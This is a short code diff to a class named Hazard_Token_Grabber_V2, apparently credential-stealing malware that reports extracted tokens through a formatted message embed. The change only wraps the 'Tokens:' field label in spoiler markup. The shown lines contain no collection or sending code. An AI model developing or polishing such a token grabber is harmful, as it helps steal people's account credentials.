@@ -556,7 +556,7 @@ class Hazard_Token_Grabber_V2(functions):
                             'inline': True
                         },
                         {
-                            'name': '**Tokens:**',
+                            'name': '||**Tokens:**||',
                             'value': f'''```yaml
                                 {tokens if tokens else "No tokens extracted"}```
                             '''.replace(' ', ''),
